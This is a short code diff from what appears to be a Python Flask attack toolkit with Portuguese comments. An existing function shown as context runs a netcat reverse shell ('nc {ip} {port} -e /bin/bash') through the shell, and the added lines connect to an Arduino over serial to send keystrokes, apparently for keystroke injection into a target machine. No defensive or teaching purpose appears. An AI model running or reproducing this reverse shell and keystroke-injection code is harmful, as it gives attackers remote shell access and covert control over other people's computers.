@@ -24,6 +24,19 @@ def run_reverse_shell(ip, port):
     command = f"nc {ip} {port} -e /bin/bash"
     subprocess.run(command, shell=True)
 
+# Configuração da comunicação serial com o Arduino
+try:
+    arduino = serial.Serial('/dev/ttyS0', 9600, timeout=1)
+    time.sleep(2)  # Aguarda a inicialização do Arduino
+except serial.SerialException:
+    arduino = None
+
+def send_keystroke(command):
+    """Envia um comando de teclado ao Arduino via serial."""
+    if arduino and arduino.isOpen():
+        arduino.write((command + '\n').encode())
+        time.sleep(0.5)
+
 @app.route('/')
 def home():
     options = [
